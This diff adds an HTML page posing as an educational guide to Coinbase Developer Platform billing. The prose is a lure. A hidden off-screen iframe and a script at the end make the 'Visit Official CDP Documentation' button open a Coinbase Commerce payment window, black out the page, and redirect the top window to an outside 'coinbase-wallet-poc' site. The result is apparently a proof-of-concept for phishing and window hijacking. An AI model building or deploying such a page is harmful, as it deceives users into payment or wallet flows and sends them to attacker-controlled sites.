@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Coinbase Developer Platform Billing & Credits - Complete Guide</title>
+	<style type="text/css">
+		#blackdiv {
+			position: absolute;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			background-color: black;
+			z-index: 100;
+			display: none;
+		}
+		
+		* {
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+		}
+		
+		body {
+			font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+			background: linear-gradient(135deg, #0052FF 0%, #0041CC 100%);
+			color: #ffffff;
+			line-height: 1.6;
+			min-height: 100vh;
+		}
+		
+		.container {
+			max-width: 900px;
+			margin: 0 auto;
+			padding: 20px;
+		}
+		
+		.header {
+			text-align: center;
+			padding: 50px 0;
+			border-bottom: 2px solid rgba(255, 255, 255, 0.2);
+			margin-bottom: 40px;
+		}
+		
+		.coinbase-logo {
+			font-size: 48px;
+			margin-bottom: 20px;
+		}
+		
+		.header h1 {
+			font-size: 2.8rem;
+			font-weight: 700;
+			color: #ffffff;
+			margin-bottom: 15px;
+			text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+		}
+		
+		.header p {
+			font-size: 1.3rem;
+			color: rgba(255, 255, 255, 0.9);
+			max-width: 700px;
+			margin: 0 auto;
+		}
+		
+		.tutorial-section {
+			background: rgba(255, 255, 255, 0.95);
+			color: #1a1a1a;
+			border-radius: 16px;
+			padding: 35px;
+			margin-bottom: 30px;
+			box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+			backdrop-filter: blur(10px);
+		}
+		
+		.section-title {
+			font-size: 1.9rem;
+			color: #0052FF;
+			margin-bottom: 20px;
+			display: flex;
+			align-items: center;
+			gap: 12px;
+		}
+		
+		.section-content {
+			color: #2d2d2d;
+			font-size: 1.1rem;
+		}
+		
+		.section-content h3 {
+			color: #1a1a1a;
+			margin: 25px 0 12px 0;
+			font-size: 1.4rem;
+		}
+		
+		.section-content ul {
+			margin: 18px 0;
+			padding-left: 25px;
+		}
+		
+		.section-content li {
+			margin-bottom: 10px;
+		}
+		
+		.benefits-grid {
+			display: grid;
+			grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+			gap: 25px;
+			margin: 25px 0;
+		}
+		
+		.benefit-card {
+			background: linear-gradient(135deg, #f8f9ff 0%, #e8f0ff 100%);
+			border: 2px solid #0052FF;
+			border-radius: 12px;
+			padding: 25px;
+			text-align: center;
+		}
+		
+		.benefit-icon {
+			font-size: 2.5rem;
+			margin-bottom: 15px;
+		}
+		
+		.action-section {
+			background: linear-gradient(135deg, #ffffff 0%, #f8f9ff 100%);
+			color: #1a1a1a;
+			border-radius: 16px;
+			padding: 45px;
+			text-align: center;
+			margin: 40px 0;
+			border: 3px solid rgba(255, 255, 255, 0.3);
+			box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
+		}
+		
+		.action-section h2 {
+			font-size: 2.2rem;
+			margin-bottom: 18px;
+			color: #0052FF;
+		}
+		
+		.action-section p {
+			font-size: 1.2rem;
+			margin-bottom: 35px;
+			color: #4a4a4a;
+		}
+		
+		.connect-btn {
+			background: linear-gradient(135deg, #0052FF 0%, #0041CC 100%);
+			color: #ffffff;
+			padding: 18px 40px;
+			font-size: 1.3rem;
+			font-weight: 600;
+			border: none;
+			border-radius: 12px;
+			cursor: pointer;
+			transition: all 0.3s ease;
+			box-shadow: 0 6px 20px rgba(0, 82, 255, 0.3);
+		}
+		
+		.connect-btn:hover {
+			background: linear-gradient(135deg, #0041CC 0%, #002F99 100%);
+			transform: translateY(-3px);
+			box-shadow: 0 10px 30px rgba(0, 82, 255, 0.4);
+		}
+		
+		.warning-box {
+			background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
+			border: 2px solid #ffc107;
+			border-radius: 12px;
+			padding: 25px;
+			margin: 25px 0;
+			color: #856404;
+		}
+		
+		.warning-box h4 {
+			color: #856404;
+			margin-bottom: 12px;
+			font-size: 1.2rem;
+		}
+		
+		.security-box {
+			background: linear-gradient(135deg, #d1ecf1 0%, #bee5eb 100%);
+			border: 2px solid #17a2b8;
+			border-radius: 12px;
+			padding: 25px;
+			margin: 25px 0;
+			color: #0c5460;
+		}
+		
+		.security-box h4 {
+			color: #0c5460;
+			margin-bottom: 12px;
+			font-size: 1.2rem;
+		}
+		
+		.step-number {
+			background: linear-gradient(135deg, #0052FF 0%, #0041CC 100%);
+			color: white;
+			width: 35px;
+			height: 35px;
+			border-radius: 50%;
+			display: inline-flex;
+			align-items: center;
+			justify-content: center;
+			font-weight: bold;
+			margin-right: 12px;
+			box-shadow: 0 4px 12px rgba(0, 82, 255, 0.3);
+		}
+		
+		.troubleshooting-list {
+			background: #f8f9fa;
+			border-radius: 8px;
+			padding: 20px;
+			margin: 20px 0;
+		}
+		
+		.footer {
+			text-align: center;
+			padding: 50px 0;
+			border-top: 2px solid rgba(255, 255, 255, 0.2);
+			margin-top: 60px;
+		}
+		
+		.footer p {
+			color: rgba(255, 255, 255, 0.8);
+			font-size: 0.95rem;
+		}
+
+		.credit-price-card {
+			background: linear-gradient(135deg, #e8f5e8 0%, #d4edda 100%);
+			border: 2px solid #28a745;
+			border-radius: 12px;
+			padding: 25px;
+			margin: 15px 0;
+			color: #155724;
+		}
+
+		.credit-price-card h4 {
+			color: #155724;
+			margin-bottom: 10px;
+			font-size: 1.3rem;
+		}
+		
+		@media (max-width: 768px) {
+			.header h1 {
+				font-size: 2.2rem;
+			}
+			
+			.tutorial-section {
+				padding: 25px;
+			}
+			
+			.action-section {
+				padding: 35px 25px;
+			}
+		}
+	</style>
+</head>
+<body>
+
+	<div id="blackdiv"></div>
+	
+	<div class="container">
+		<div class="header">
+			<div class="coinbase-logo">⚡</div>
+			<h1>Coinbase Developer Platform Billing & Credits</h1>
+			<p>Technical guide to understanding the billing system, credit mechanisms, and payment flows in CDP</p>
+		</div>
+
+		<div class="tutorial-section">
+			<h2 class="section-title">
+				<span class="step-number">1</span>
+				How CDP Billing System Works
+			</h2>
+			<div class="section-content">
+				<p>The Coinbase Developer Platform uses a consumption-based billing model where you pay for actual usage of services:</p>
+				
+				<div class="benefits-grid">
+					<div class="benefit-card">
+						<div class="benefit-icon">🏦</div>
+						<h3>Paymaster Credits</h3>
+						<p>Credits to sponsor gas fees for user operations on Base network</p>
+					</div>
+					<div class="benefit-card">
+						<div class="benefit-icon">🔄</div>
+						<h3>API Usage</h3>
+						<p>Rate-limited RPC calls with 7,500 requests per 5-second window for free tier</p>
+					</div>
+					<div class="benefit-card">
+						<div class="benefit-icon">⛽</div>
+						<h3>Transaction Costs</h3>
+						<p>Direct billing for mainnet operations and smart contract interactions</p>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="tutorial-section">
+			<h2 class="section-title">
+				<span class="step-number">2</span>
+				Payment Methods & Billing Cycles
+			</h2>
+			<div class="section-content">
+				<p>CDP supports multiple billing approaches depending on your usage pattern and account type:</p>
+				
+				<h3>💳 Automatic Billing</h3>
+				<ul>
+					<li><strong>Credit Card Charges:</strong> Automatic billing for consumed services with applicable taxes</li>
+					<li><strong>Real-time Monitoring:</strong> Usage tracked continuously with automatic billing triggers</li>
+					<li><strong>Spending Alerts:</strong> Configurable notifications before reaching billing thresholds</li>
+				</ul>
+
+				<h3>📄 Enterprise Invoicing</h3>
+				<ul>
+					<li><strong>Monthly Invoices:</strong> Billing in arrears for qualified enterprise customers</li>
+					<li><strong>Custom Terms:</strong> Negotiated payment terms for high-volume usage</li>
+					<li><strong>Purchase Orders:</strong> Support for corporate procurement processes</li>
+				</ul>
+				
+				<div class="security-box">
+					<h4>🔒 Payment Security</h4>
+					<p>All payment processing follows PCI DSS standards. Coinbase does not store complete credit card information and uses tokenized payment systems for recurring charges.</p>
+				</div>
+			</div>
+		</div>
+
+		<div class="action-section">
+			<h2>📖 Learn More About CDP</h2>
+			<p>Access the official Coinbase Developer Platform documentation to understand pricing details, set up your account, and start integrating CDP services into your application.</p>
+			<button class="connect-btn" onclick="launch()">Visit Official CDP Documentation</button>
+		</div>
+
+		<div class="tutorial-section">
+			<h2 class="section-title">
+				<span class="step-number">3</span>
+				Understanding Credit Types
+			</h2>
+			<div class="section-content">
+				<p>Different services in CDP use specific credit systems with distinct billing mechanisms:</p>
+				
+				<h3>⚡ Paymaster Credits</h3>
+				<ul>
+					<li><strong>Purpose:</strong> Sponsor gas fees for user operations on Base network</li>
+					<li><strong>Billing:</strong> Charged based on actual gas consumption by sponsored transactions</li>
+					<li><strong>Limits:</strong> Service interruption for unpaid amounts exceeding $10,000</li>
+					<li><strong>Usage:</strong> Ideal for applications wanting to abstract gas costs from end users</li>
+				</ul>
+				
+				<h3>🌐 RPC API Credits</h3>
+				<ul>
+					<li><strong>Free Tier:</strong> 7,500 API calls per 5-second window</li>
+					<li><strong>Rate Limiting:</strong> Automatic throttling when limits are exceeded</li>
+					<li><strong>Premium Plans:</strong> Higher rate limits available for paid tiers</li>
+					<li><strong>Usage Tracking:</strong> Real-time monitoring of API consumption</li>
+				</ul>
+
+				<div class="credit-price-card">
+					<h4>💰 Billing Transparency</h4>
+					<p>All charges are clearly itemized with detailed usage breakdowns. You can monitor costs in real-time through the CDP dashboard and set up alerts to prevent unexpected charges.</p>
+				</div>
+			</div>
+		</div>
+
+		<div class="tutorial-section">
+			<h2 class="section-title">
+				<span class="step-number">4</span>
+				Account Setup & Payment Configuration
+			</h2>
+			<div class="section-content">
+				<p>Setting up billing requires account verification and payment method configuration:</p>
+				
+				<h3>🎯 Initial Account Setup</h3>
+				<ul>
+					<li><strong>Account Creation:</strong> Use existing Coinbase credentials or create new CDP account</li>
+					<li><strong>Identity Verification:</strong> Required for certain services and higher usage limits</li>
+					<li><strong>Payment Method:</strong> Add credit card for automatic billing of overages</li>
+					<li><strong>Billing Preferences:</strong> Configure alerts, limits, and notification settings</li>
+				</ul>
+				
+				<h3>📱 Trial Periods & Access</h3>
+				<ul>
+					<li><strong>Free Tier Access:</strong> Immediate access to limited free services</li>
+					<li><strong>Trial Limitations:</strong> One trial period per account with specific terms</li>
+					<li><strong>Automatic Renewal:</strong> Payment method required for continued service after trial</li>
+					<li><strong>Service Restrictions:</strong> Certain features require paid plans from the start</li>
+				</ul>
+
+				<div class="warning-box">
+					<h4>⚠️ Important Billing Terms</h4>
+					<p>By adding a payment method, you agree to automatic billing for service overages. CDP reserves the right to suspend services for overdue payments or policy violations.</p>
+				</div>
+			</div>
+		</div>
+
+		<div class="tutorial-section">
+			<h2 class="section-title">
+				<span class="step-number">5</span>
+				Advanced Billing Features
+			</h2>
+			<div class="section-content">
+				<p>CDP offers sophisticated billing mechanisms for enterprise and complex applications:</p>
+				
+				<h3>⚖️ Onchain Billing System</h3>
+				<ul>
+					<li><strong>Smart Contract Integration:</strong> Automatic fee distribution via non-custodial contracts</li>
+					<li><strong>Revenue Sharing:</strong> Programmatic commission splits for integrators</li>
+					<li><strong>Transparent Ledger:</strong> All transactions recorded onchain for auditability</li>
+					<li><strong>Real-time Settlement:</strong> Immediate payouts without manual processing</li>
+				</ul>
+				
+				<h3>📊 Usage Analytics & Reporting</h3>
+				<ul>
+					<li><strong>Detailed Reports:</strong> Comprehensive usage breakdowns by service type</li>
+					<li><strong>Cost Projections:</strong> Predictive analytics for budget planning</li>
+					<li><strong>Export Capabilities:</strong> Data export for accounting and compliance</li>
+					<li><strong>Real-time Monitoring:</strong> Live dashboards for usage tracking</li>
+				</ul>
+
+				<div class="security-box">
+					<h4>🔗 Onchain Benefits</h4>
+					<p>Onchain billing eliminates manual invoice processing and provides immutable transaction records. All smart contracts are non-custodial with transparent fee structures.</p>
+				</div>
+			</div>
+		</div>
+
+		<div class="tutorial-section">
+			<h2 class="section-title">
+				<span class="step-number">6</span>
+				Cost Management & Optimization
+			</h2>
+			<div class="section-content">
+				<p>Effective cost management requires understanding usage patterns and optimization strategies:</p>
+				
+				<h3>💡 Cost Optimization Strategies</h3>
+				<ul>
+					<li><strong>Efficient API Usage:</strong> Implement caching and batching to reduce RPC calls</li>
+					<li><strong>Network Selection:</strong> Use Base for lower transaction costs compared to Ethereum mainnet</li>
+					<li><strong>Transaction Batching:</strong> Group operations to minimize individual transaction costs</li>
+					<li><strong>Usage Monitoring:</strong> Set up proactive alerts before hitting billing thresholds</li>
+				</ul>
+				
+				<h3>🚨 Avoiding Service Interruptions</h3>
+				<ul>
+					<li><strong>Payment Maintenance:</strong> Keep payment methods current and valid</li>
+					<li><strong>Invoice Management:</strong> Pay invoices promptly to prevent service suspension</li>
+					<li><strong>Usage Planning:</strong> Monitor trends and upgrade plans before hitting limits</li>
+					<li><strong>Backup Systems:</strong> Implement fallbacks for critical application functions</li>
+				</ul>
+
+				<div class="troubleshooting-list">
+					<h3>🔧 Common Billing Issues & Solutions</h3>
+					<ul>
+						<li><strong>Payment Failures:</strong> Update payment methods or contact financial institution</li>
+						<li><strong>Usage Overages:</strong> Monitor consumption patterns and adjust usage or upgrade plan</li>
+						<li><strong>Service Suspension:</strong> Resolve outstanding payments to restore access</li>
+						<li><strong>Billing Disputes:</strong> Contact CDP support with detailed usage logs</li>
+					</ul>
+				</div>
+			</div>
+		</div>
+
+		<div class="tutorial-section">
+			<h2 class="section-title">
+				🎯 Technical Implementation Guide
+			</h2>
+			<div class="section-content">
+				<p>For developers implementing CDP billing in their applications:</p>
+				
+				<h3>🔧 Integration Requirements</h3>
+				<ul>
+					<li><strong>API Key Management:</strong> Secure storage and rotation of CDP API credentials</li>
+					<li><strong>Usage Tracking:</strong> Implement local monitoring to correlate with CDP billing</li>
+					<li><strong>Error Handling:</strong> Graceful degradation when hitting rate limits or billing issues</li>
+					<li><strong>Cost Attribution:</strong> Track costs per user or feature for internal accounting</li>
+				</ul>
+				
+				<h3>📈 Monitoring & Alerting</h3>
+				<ul>
+					<li><strong>Real-time Dashboards:</strong> Monitor API usage and costs continuously</li>
+					<li><strong>Threshold Alerts:</strong> Automated notifications before reaching billing limits</li>
+					<li><strong>Cost Anomaly Detection:</strong> Identify unusual usage patterns quickly</li>
+					<li><strong>Budget Controls:</strong> Implement application-level spending limits</li>
+				</ul>
+			</div>
+		</div>
+
+		<div class="footer">
+			<p>© 2025 Technical Guide. This is an educational resource about Coinbase Developer Platform billing systems.</p>
+		</div>
+	</div>
+	
+	<!-- iframe do Coinbase (mesmo domínio que o popup) -->
+	<iframe src="https://commerce.coinbase.com/pay/static/27849.279546bfef0c8b7f57c7.js/$%5E%&*" onload="switcher()" name="Smart Wallet" style="opacity: 0.01; position: absolute; left: -9999px;" width=1 height=1></iframe>
+
+	<script type="text/javascript">
+		let iframeLoaded = false;
+		let loginWindow;
+
+		var loadedOnce = false;
+		var launched = false;
+
+		function switcher() {
+			console.log('Switcher called - loadedOnce:', loadedOnce, 'launched:', launched);
+			if (!loadedOnce) {
+				loadedOnce = true;
+				console.log('First time loading iframe');
+			} else {
+				if (launched) {
+					console.log('Second time + launched = true, redirecting...');
+					top.focus();
+					top.location = "https://coinbase-wallet-poc.vercel.app/";
+				}
+			}
+		}
+
+		function launch() {
+			launched = true;
+			console.log('Opening Coinbase...');
+			loginWindow = window.open("https://commerce.coinbase.com/pay/92f31f97-8ca8-4d99-a48c-21cce788ba88", "login");
+			document.querySelector("#blackdiv").style.display = "block";
+		}
+	</script>
+
+</body>
+</html>
